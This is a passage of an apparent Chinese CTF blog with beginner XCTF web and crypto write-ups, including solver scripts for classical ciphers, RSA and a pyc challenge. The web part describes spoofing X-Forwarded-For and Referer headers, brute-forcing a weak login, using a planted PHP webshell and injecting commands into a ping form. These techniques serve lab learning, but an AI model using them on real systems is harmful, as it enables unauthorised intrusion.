&lt; k-1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p;return pass; &#125; String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30")); h = window.prompt('Enter password'); alert( dechiffre(h) );&lt;/script&gt; 看源码得知不论输入什么都会跳转至假密码然后失败，于是直接处理fromCharCode，得到flag 12345678910&gt;&gt;&gt; s = "\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"&gt;&gt;&gt; print(s)"55,56,54,79,115,69,114,116,107,49,50"&gt;&gt;&gt; a = [55,56,54,79,115,69,114,116,107,49,50]&gt;&gt;&gt; s = ""&gt;&gt;&gt; for i in a:... b =chr(i)... s += b&gt;&gt;&gt; print(s)786OsErtk12 0x08 xff referer 题目描述：X老师告诉小宁其实xff和referer是可以伪造的 直接访问网站，提示需要特定ip访问 由题目描述猜想是改http请求，进行下一步. 百度xff可知 X-Forwarded-For位于HTTP协议的请求头， 是一个 HTTP 扩展头部。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入RFC 7239（Forwarded HTTP Extension）标准之中。 利用burpsuite直接伪造http header 的 X-Forwarded-For， X-Forwarded-For 请求头格式如下 1X-Forwarded-For: client, proxy1, proxy2 可以看到，XFF 的内容由「英文逗号 + 空格」隔开的多个部分组成，最开始的是离服务端最远的设备 IP，然后是每一级代理设备的 IP 如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息X-Forwarded-For: IP0, IP1, IP2 PS： Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求 然后得到如下页面 百度Refer可知 HTTP_REFERER提供了引导用户代理到当前页的前一页的地址信息，常见的一些应用场景有防盗链，统计文章有多少次是来自谷歌搜索结果，多少次来自百度搜索结果等。 什么时候获取不到HTTP_REFERER值 综上所述，HTTP_REFERER存在需要两个条件： 浏览器（客户端）请求（服务器端请求的情况下，是不存在HTTP_REFERER的，但是可以伪造header，这在下一节中将提及）；存在前导页； ​ 以下是一些获取不到HTTP_REFERER值的情况： 在浏览器内直接敲URL windows桌面上的超链接图标 浏览器内书签 第三方软件（如Word，Excel等）内容中的链接 SSL认证网站跳入 &lt; http://example.com/“&gt; meta页面设置自动跳转时，在example.com将取不到REFERER URL 使用JavaScript的Location.href或者是Location.replace() 在以下情况下可以获取HTTP_REFERER值： 直接用form提交的表单(POST或GET) src请求（如js的script标签及html中img标签的src属性） 直接伪造header的Referer属性 但是没有得到结果 后面百度发现，url/xxx和url/xxx/是不一样的，url/xxx是直接访问xxx的文件，而url/xxx/是访问xxx目录，因此我们刚才得不到flag，将Referer的后面的斜杠去掉，再次请求，得到flag 0x09 weak_auth 题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。 直接点login跳转到了check.php，提示：please login as admin 用admin空密码去登陆，显示：password error 点确认，F12查看源码&lt;script&gt;alert(&#39;password error&#39;);&lt;/script&gt;&lt;!--maybe you need a dictionary--&gt;提示可能需要一个字典，肯定是爆破了 因此，我去学习了BurpSuite的Intruder功能——用于爆破的一个工具。 关于Burp Suite 的Intruder模块的四种选项的解释 https://howiezhao.github.io/2018/05/01/burpsuite-intruder-attack-type/ 关于BurpSuite的Intruder模块的解释： https://www.cnblogs.com/yufusec/p/9179625.html 然后爆破得到密码123456，进入系统得到flag 0x0a webshell 题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。 webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将 其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服 务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。 顾名思义，”web”的含义是显然需要服务器开放web服务，”shell”的含义是取得对服务器某 种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操 作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。 首先新建一个index.php文件，把PHP代码输入到里面，电脑可能会自动识别它为病毒，并 删除，可以恢复后使用 正如题目提示：php一句话——即php一句话木马： https://my.oschina.net/programs/blog/1649544 了解之后，想用burpsuite的post请求发送也没能获取数据，于是看了wp，用中国蚁剑连了webshell，然后直接发现目录底下就有flag.txt。 做完之后，查看官方wp，我也没弄懂他wp怎么用burpsuite去post数据来获取webshell（我回显不了数据 update：post没有回显是因为我少了分号，还有就是hackbar的post没有发出去。后面成功用burpsuite发送post请求，成功执行命令。 0x0b command execution 题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 进入页面有个输入框，尝试输入127.0.0.1发现能够ping通并显示命令 于是联想到命令拼接利用&amp;或|或；让我们的命令和ping一起执行，发现flag在/home/flag.txt里 用find命令的时候，不知道为什么在他的shell里搜索的时候要带引号，即find / -name &quot;flag*&quot;才能成功执行命令回显，去掉引号即失败了。 0x0c simple php 题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。 123456789101112131415&lt;?phpshow_source(__FILE__);include("config.php");$a=@$_GET['a'];$b=@$_GET['b'];if($a==0 and $a)&#123; echo $flag1;&#125;if(is_numeric($b))&#123; exit();&#125;if($b&gt;1234)&#123; echo $flag2;&#125;?&gt; 进入页面，见到如上php代码，应该是代码审计。 即让a满足$a==0 and $a且b满足is_numeric($b)==flase&amp;$b&gt;1234得到两个flag php中的弱类型比较会使’abc’ == 0为真，所以输入a=abc时，可得到flag1。（abc可换成任意字符）。 is_numeric() 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE,且php中弱类型比较时，会使(‘1234a’ == 1234)为真，所以当输入a=abc&amp;b=1235a，可得到flag2。 发现“0”为 true，所以可以把参数 a 构造为’0’或者‘alph’这种转换后为 0 但本身不为 False 的 形式 数字和字符混合的字符串转换为整数后只保留数字]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XCTF-adworld-crypto-wp]]></title>
    <url>%2F2019%2F11%2F10%2FXCTF-adworld-crypto-wp%2F</url>
    <content type="text"><![CDATA[Crypto&amp;WriteUpcrypto永远充满了google和常识（还有工具 攻防世界&amp;Crypto新手练习区0x01 幂数加密 题目描述：你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母} 下载附件打开查看是txt，里面放一段数字 18842101220480224404014224202480122 由ctf-wiki的常识可知，这是01248加密，即以0为分割，将其中的数加起来对应字母表的排位。 解得flag 12301248：23 5 12 12 4 15 14 5w e l l d o n e 0x02 base64 题目描述：元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。 打开附件是一段英文，有题目得知是base64编码，解码得flag 12Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9cyberpeace&#123;Welcome_to_new_World!&#125; 0x03 Caesar 题目描述：你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了 由题目得知是凯撒密码，随便百度一个工具进行暴力破解得知，移位12位 快捷：算出o和c得插值，但是我觉得更慢 12oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;cyberpeace&#123;you_have_learned_caesar_encryption&#125; 0x04 Morse 题目描述：小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写) 下载附件，打开文档是一串01串 111 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110 假如按1:=.&amp;0:=-翻译则第一个字母可翻译，但是后面有一个字符无法翻译 因此，01调换顺序1:=-&amp;0:=. 利用python的str.replace的到.-的morsecode，找个在线工具直接翻译得到结果，需要自己加上cyberpeace{}格式：cyberpeace{morsecodeissointeresting} 1morsecodeissointeresting 可惜我后来没注意到需要全部小写，浪费了时间。 0x05 Railfence 题目描述：被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。 打开附件是一个文档如下，如题目明显的是栅栏加密。找了个在线工具破解。 1ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g 结果常规栅栏加密没跑出来，在看到题目有一个数字5盲猜这可能是栅栏加密的key，但是常规的是跑不出来flag的，后面看百科知道有个是www型栅栏加密 PS:WWW型的加密密钥就不只能是字符串长度的因子，小于其长度的任何一个数都可能是其key值，所以第一步也是确定密钥。 由题目可知key可能是5，一尝试果然正确，得到flag：cyberpeace{railfence_cipher_gogogo} 附一个www型栅栏密码的网站： http://www.atoolbox.net/Tool.php?Id=777 附赠一个栅栏密码的脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/env python3#常见的栅栏解密e = input('清输入要解密的字符串\n')elen = len(e) # 计算字符串长度field = []for i in range(2, elen): # 做一个循环，从2开始到数字elen（字符串长度） if elen % i == 0: # 计算那些数字能整除字符串长度 field.append(i) # 将能整出的数字加入到field里面for f in field: b = elen // f # 用字符串实际长度除以上面计算出能整出的数字f result = &#123;x: '' for x in range(b)&#125; for i in range(elen): # 字符串有多少位，就循环多少次 a = i % b result.update(&#123;a: result[a] + e[i]&#125;) # 字符串截断，并更新数据 d = '' for i in range(b): d += result[i] print('分为'+str(f)+'栏时，解密结果为：'+d+'\n') # 输出结果，并开始下一个循环 #W型加密string=input("输入要加密的字符串\n")length = len(string)#猜想不会是一栏,和n栏（滑稽）因为这个就是原来字符串（狗头）#那么，就暴力遍历一波其中的那些⑧for i in range(2,length): result=&#123;x:""for x in range(i)&#125; for a in range(length) : width=i*2-2 num=a%width if(num&lt;i): result.update(&#123;num:result[num]+string[a]&#125;) else: ll=2*i-2-num result.update(&#123;ll:result[ll]+string[a]&#125;) d='' for k in range(i): d=d+result[k] print("分为"+str(i)+"栏,结果是："+d) 0x06 转轮机加密 题目描述：你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊 看题目可知是转轮机算法 附件内容如下： 123456789101112131415161: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;11： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;12： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;13： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;密钥为： 2,3,7,5,13,12,9,1,8,10,4,11,6密文为：NFQKSEVOQOFNP //TODO：还需要搞清楚转轮机算法的原理，有点混乱现在 官方wp给出以下python自动化脚本 12345678910111213141516import resss='''1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;'''m="NFQKSEVOQOFNP"content=re.findall(r'&lt; (.*?) &lt;',sss,re.S)iv=[2,3,7,5,13,12,9,1,8,10,4,11,6]vvv=[]ans=""for i in range(13): index=content[iv[i]-1].index(m[i]) vvv.append(index)for i in range(0,26): flag="" for j in range(13): flag+=content[iv[j]-1][(vvv[j]+i)%26] print(flag) 0x07 easy RSA打开附件查看。 123456789在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出dfi=(p-1)(q-1)--------------------------------------------------------------e*d=1 mod fid=e^(fi(fi)-1) 感谢舍友的cpp文件 12345678910111213141516171819202122232425#include&lt;iostream&gt;#include&lt;cstdio&gt;#define ll long longll gcd(ll a,ll b,ll&amp;aa,ll&amp;bb)&#123;4ll ab=0,ba=0;aa=1;bb=1;4while(1)&#123;44if(a==0)&#123;aa=ba;return b;&#125;44ba-=(b/a)*aa;bb-=(b/a)*ab;b%=a;44if(b==0)&#123;bb=ab;return a;&#125;44aa-=(a/b)*ba;ab-=(a/b)*bb;a%=b;4&#125;&#125;ll mod_inverse(ll a,ll mod)&#123;4ll res,temp;4ll d=gcd(a,mod,res,temp);4if(d==1)return res;4return -1;&#125;int main()&#123;4ll p,q,e,d;4p = 473398607161;4q = 4511491;4e = 17;4std::cout&lt;&lt;mod_inverse(e,(p-1)*(q-1))&lt;&lt;std::endl;&#125; 根据舍友给的rsa的cpp文件改出的python脚本，不会爆longlong哦（虽然原题也不会爆。 1234567891011121314151617181920212223242526272829303132333435def EX_GCD(a,b,arr): #扩展欧几里得 if b == 0: arr[0] = 1 arr[1] = 0 return a g = EX_GCD(b, a % b, arr) t = arr[0] arr[0] = arr[1] arr[1] = t - int(a / b) * arr[1] return g4def ModReverse(a,n): #ax=1(mod n) 求a模n的乘法逆x arr = [0,1,] gcd = EX_GCD(a,n,arr) if gcd == 1: return (arr[0] % n + n) % n else: return -1'''while True: a,b = eval(input()) print(ModReverse(a,b))'''if __name__=='__main__':4while True:44l = input("p,q,e:")44p,q,e = map(lambda x:int(x),l.split(","))44fn = (p-1)*(q-1)44#print(l)44d = ModReverse(e,fn)44print("d=%d"%d) PS：看官方wp给出了一个GitHub项目地址：一款可以解rsa的工具 https://github.com/3summer/CTF-RSA-tool 1python solve.py --verbose --private -N 2135733555619387051 -e 17 -p 473398607161 -q 4511491 0x08 Normal_RSA 题目描述：你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学 很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案 做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光 果然，解rsa都是需要工具的，看完官方wp后，发现只需要ctf-rsa-tools一行代码就能跑出flag来。 甚至连题目给的样例都是人家example里的（虽然是摘自PCTF。 1python solve.py --verbose -k examples/jarvis_oj_mediumRSA/pubkey.pem --decrypt examples/jarvis_oj_mediumRSA/flag.enc 不过在看wp时，发现有人给了另一种常规解法 他的解题思路解题思路是：①使用 openssl 解密.pem 中参数 –&gt; ②参数十六进制转换为十进制 –&gt; ③ 利用 factor 对大整数进行分解，得到 p 和 q –&gt; ④用 rsatool 生成私钥文件: private.pem –&gt; ⑤用 private.pem 解密 flag.enc 其中第三步factor用到的网站为：http://www.factordb.com/ 1234567891011121314#1$openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem#2将得到的modulus用python进行转换$python&gt;&gt;&gt; 0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD 87924348264132406875276140514499937145050893665602592992418171647042491658461&gt;&gt;&gt;#3 进入网站 http://www.factordb.com/ 将大整数分解为p，q#p= 275127860351348928173285174381581152299 #q= 319576316814478949870590164193048041239#4 利用rsatool 生成私钥文件 private.pem$python rsatool.py -o private.pem -e 65537 -p XXX -q XXX#5$openssl rsautl -decrypt -in flag.enc -inkey private.pem 0x09 不仅仅是Morse 题目描述：“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案} 题目附件给了一大串摩斯电码，按常理找一个网站解密了 1--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.- 摩斯电码解密网站： http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx 解出来如下，明显嵌套了另外一种加密 1MAY..--.-BE..--.-HAVE..--.-ANOTHER..--.-DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA 因为后面一串AB串，转摩斯翻译不出来，因为不晓得哪里分界，转为二进制也没有思路，百度得知这是培根密码 培根密码解密网站： http://rumkin.com/tools/cipher/baconian.php AB串解得ATTACKANDDEFENCEWORLDISINTERESTING 记得小写。 0x0a 混合编码 题目描述：经过了前面那么多题目的历练，耐心细致在解题当中是 必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长 好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌 走向了下面的挑战。格式为cyberpeace{小写的你解出的答案} 这题感觉没什么好说的，下载附件发现 1JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzk7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM2ODsmIzY5OyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjNTI7JiM3NjsmIzEyMjsmIzEwNzsmIzUzOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc3OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiMxMDc7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzg7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjODQ7JiM2OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzUwOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc4OyYjMTA1OyYjNTY7JiM1MzsmIzc4OyYjMTIxOyYjNTY7JiM1MzsmIzc5OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM5OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjNjk7JiMxMTk7JiM3NzsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjNjU7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM2OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjMTA3OyYjNTM7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM4NDsmIzEwNzsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzEyMDsmIzc2OyYjMTIyOyYjNjk7JiMxMjA7JiM3ODsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjMTAzOyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjMTE5Ow== 明显的base64编码，解base64得到如下： 1&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119; 明显的unicode编码，解码得到如下 1LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw 没有明显特征，解一波base64得到如下 1/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100 盲猜Ascii吗 1234567&gt;&gt;&gt; a = '/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100'&gt;&gt;&gt; l = a.split('/')&gt;&gt;&gt; s = ''&gt;&gt;&gt; for i in range(30):#从i+1开始因为/的原因，l[0] = ''... s += chr(int(l[i+1]))&gt;&gt;&gt; s'welcometoattackanddefenceworld' 得到flag：cyberpeace{welcometoattackanddefenceworld} 0x0b easychallenge 题目描述：你们走到了一个冷冷清清的谜题前面，小鱼看着题目给的信息束手无策，丈二和尚摸不着头脑 ，你嘿嘿一笑，拿出来了你随身带着的笔记本电脑，噼里啪啦的敲起来了键盘，清晰的函数逻辑和流程出现在 了电脑屏幕上，你敲敲键盘，更改了几处地方，运行以后答案变出现在了电脑屏幕上。 下载附件发现是一个pyc文件，明显是一个已经编译的python文件 百度搜反编译pyc，找到一个在线反编译网站 https://tool.lu/pyc/ 反编译得到源代码： 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python# encoding: utf-8# 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pycimport base64def encode1(ans): s = '' for i in ans: x = ord(i) ^ 36 x = x + 25 s += chr(x) return sdef encode2(ans): s = '' for i in ans: x = ord(i) + 36 x = x ^ 36 s += chr(x) return sdef encode3(ans): return base64.b32encode(ans)flag = ' 'print 'Please Input your flag:'flag = raw_input()final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='if encode3(encode2(encode1(flag))) == final: print 'correct'else: print 'wrong' 易知chr和ord为反函数、x^a^a=x、base64.b32decode()和base64.b32encode()互为反函数 因此写一个python脚本即可得出flag 1234567891011121314151617181920&gt;&gt;&gt; final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='&gt;&gt;&gt; import base64&gt;&gt;&gt; a = base64.b32decode(final)#decode3&gt;&gt;&gt; ab'\xa0\xbe\xa7Z\xb7\xb5Z\xa6\xa0Z\xb8\xae\xa3\xa9Z\xb7Z\xb0\xa9\xae\xa3\xa4\xad\xad\xad\xad\xad\xb2'#注意要将a的字节流转换&gt;&gt;&gt; b = "\xa0\xbe\xa7Z\xb7\xb5Z\xa6\xa0Z\xb8\xae\xa3\xa9Z\xb7Z\xb0\xa9\xae\xa3\xa4\xad\xad\xad\xad\xad\xb2"&gt;&gt;&gt; s = ''#decode2&gt;&gt;&gt; for i in b:... s += chr((ord(i)^36)-36)...&gt;&gt;&gt;&gt;&gt;&gt; s'`v_ZomZ^`ZxfciZoZpifc\\eeeeer'&gt;&gt;&gt; l = ''#decode1&gt;&gt;&gt; for i in s:... l+= chr((ord(i)-25)^36)...&gt;&gt;&gt; l'cyberpeace&#123;interestinghhhhh&#125;' PS： 1234567891011#编译python文件为.pyc文件$python -m compileall main.py#pyc的反编译#依赖python的uncompyle$pip install uncompyle#查看帮助$uncompyle6 --help#将models.pyc反编译成models.py$uncompyle6 models.pyc &gt; models.py 利用uncompyle6反编译的pyc文件和在线编译文件相同，也挺快的 0x0c easy_ECC 题目描述：转眼两个人又走到了下一个谜题的地方，这又是一种经典的密码学加密方式 而你刚好没有这个的工具，你对小鱼说“小鱼我知道数学真的很重要了，有了工具只是方便我们使用 懂了原理才能做到，小鱼你教我一下这个缇努怎么做吧！”在小鱼的一步步带领下，你终于明白了ECC 的基本原理，成功的解开了这个题目，两个人相视一笑，快步走向了下一个题目所在的位置。flag格式为cyberpeace{x+y的值} 由题目可知：这是ECC加密 